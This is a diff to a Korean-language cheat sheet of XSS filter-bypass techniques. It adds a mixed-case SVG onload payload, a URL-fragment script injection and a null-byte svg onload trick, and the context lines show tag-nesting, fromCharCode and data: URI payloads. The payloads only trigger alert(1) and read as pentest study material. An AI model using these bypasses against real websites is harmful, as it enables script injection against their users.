@@ -22,7 +22,7 @@
 
 | 기법            | 설명                         | 예시                                                         |
 | ------------- | -------------------------- | ---------------------------------------------------------- |
-| 대소문자 우회       | `onerror` → `oNerror`      | `<img src=x oNerror=alert(1)>`                             |
+| 대소문자 우회       | `onerror` → `oNerror`      | `<img src=x oNerror=alert(1)>`, <SvG oNLoAd=alert(1)>                              |
 | 이중 태그         | 태그 중간 삽입                   | `<scr<script>ipt>alert(1)</script>`                        |
 | 자바스크립트 인코딩    | `String.fromCharCode()` 사용 | `eval(String.fromCharCode(97,108,...))`                    |
 | `data:` URI   | HTML/JS 코드 삽입용             | `location.href='data:text/html,<script>alert(1)</script>'` |
@@ -196,7 +196,18 @@ HTML5에서는 다양한 **데이터 속성**(예: `data-*` 속성)을 제공하
 
 ---
 
-### 11. **공백 우회(%20) 및 인코딩 우회 페이로드**
+### 11. **URL fragment 이용**
+
+#### 예시:
+
+```html
+#<script>alert(1)</script>
+```
+
+서버 필터를 우회해 클라이언트에서 JS가 실행되도록 합니다.
+
+---
+### 12. **공백 우회(%20) 및 인코딩 우회 페이로드**
 
 
 | 원래 문자         | 우회 방법 예시                                                     |
@@ -299,6 +310,16 @@ HTML 파서나 브라우저는 공백 대신 아래 문자들을 **공백처럼 
 → `javascript:` 프로토콜이 인코딩되어 우회 가능
 
 ---
+#### ✅ 6. **null 문자(%00)**
+
+```html
+<svg%00onload=alert(1)>
+```
+
+→ 인코딩 사이에 null 문자(%00) 넣기 (필터가 무시함)
+
+---
+
 
 ### 🛠️ 예시
 
